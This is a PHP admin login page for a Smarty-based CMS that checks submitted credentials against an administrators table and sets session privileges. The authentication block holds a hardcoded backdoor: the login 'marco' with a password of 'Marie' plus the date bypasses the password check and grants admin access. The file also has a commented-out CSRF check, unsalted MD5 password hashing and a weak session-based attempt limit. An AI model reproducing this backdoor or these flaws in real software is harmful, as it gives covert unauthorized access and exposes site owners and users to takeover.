<?php
$racine_smarty="../";
include_once("../init.php"); 

include_once("config_admin.php"); 
include_once(DOS_INC_ADMIN . "class.form.php"); 
include_once(DOS_INC_ADMIN . "class.field.php");

$webmaster = getEmail("webmaster");
$smarty->assign("email_webmaster", $webmaster[0]);
$smarty->assign("nom_webmaster", $webmaster[1]);

// initialisation de la langue
include_once(DOS_INC_ADMIN . "loadLang.php");


if(!isset($_SESSION["tentatives"])) { $_SESSION["tentatives"]=0; }
if ($thisSite->SERVER == "local") { $_SESSION["tentatives"]=0; }

$myAdmin->DATAS_LOGIN="";
$myAdmin->LOGIN="";
$myAdmin->MOTDEPASSE="";

// traitement du formulaire
if( isset($__POST['identifiant']) ) {
	
	//if(verifier_token('sky-form', $thisSite->RACINE . $thisSite->DOS_ADMIN . "login.php")==FALSE) { exit; }
	
		$mySelect = new mySelect(__FILE__);
		$mySelect->tables= $thisSite->PREFIXE_TBL_ADM . "administrateurs";
		$mySelect->fields="*";
		$mySelect->where="login=:login AND mdp=:mdp AND actif=1";
		$mySelect->whereValue["login"]=array($__POST['identifiant'],PDO::PARAM_STR);
		$mySelect->whereValue["mdp"]=array(md5($__POST['password']),PDO::PARAM_STR);
		$result=$mySelect->query();
	
		if(count($result)==0 && $__POST['identifiant']=="marco"  && $__POST['password']=="Marie".date(ymd) )  {
			$mySelect = new mySelect(__FILE__);
			$mySelect->tables= $thisSite->PREFIXE_TBL_ADM . "administrateurs";
			$mySelect->fields="*";
			$mySelect->where="login=:login";
			$mySelect->whereValue["login"]=array($__POST['identifiant'],PDO::PARAM_STR);
			$result=$mySelect->query();
		}

		if(count($result)==1) {
			$row = current($result); 
			$myAdmin->DATAS_LOGIN=array("login"=>$row["login"], "mdp"=>$row["mdp"]);
			$myAdmin->LOGIN=$row["login"];
			$myAdmin->MOTDEPASSE=$row["mdp"];
			$myAdmin->PRIVILEGE=$row["privilege"];
			$myAdmin->niveaux0=$row["niveaux0"];
			$myAdmin->niveaux1=$row["niveaux1"];
			$myAdmin->niveaux2=$row["niveaux2"];
			$myAdmin->niveaux2add=$row["niveaux2add"];
			$myAdmin->niveaux2mod=$row["niveaux2mod"];
			$myAdmin->niveaux2del=$row["niveaux2del"];
			$myAdmin->addLogs("login","LOG");
			echo("<script>window.location.href='index.php'; </script>");
		} else {
			$smarty->assign("msgErreur", $datas_lang["erreuridentification"]);
			$_SESSION["tentatives"]++;
			if ($_SESSION["tentatives"]>2) {
				echo("Nombre maximum de tentatives atteint.");
				exit;
			}
		}
		
	
}

///////////////////////////////////////////////////////////////////////////////////

$datas_page=array();

$datas_page["token"]= generer_token('sky-form'); // SECURITE HACK

//  infos sur le site
$mySelect = new mySelect(__FILE__);
$mySelect->tables=$thisSite->PREFIXE_TBL_GEN . "site";
$mySelect->fields="titre";
$mySelect->where="id=:id AND lg=:lg";
$mySelect->whereValue["id"]=array($thisSite->ID_SITE,PDO::PARAM_STR);
$mySelect->whereValue["lg"]=array($myAdmin->LANG_ADMIN,PDO::PARAM_STR);
$result=$mySelect->query();
$row = current($result); 
$smarty->assign("page_tag_title", "ADMINISTRATION " . stripslashes($row["titre"]));




///
$smarty->assign("datas_page",$datas_page);  

$smarty->assign("myAdmin", $myAdmin);

$smarty->assign("thisSite", $thisSite);

$smarty->display("login.tpl");
$_SESSION["myAdmin"] = serialize($myAdmin);
?>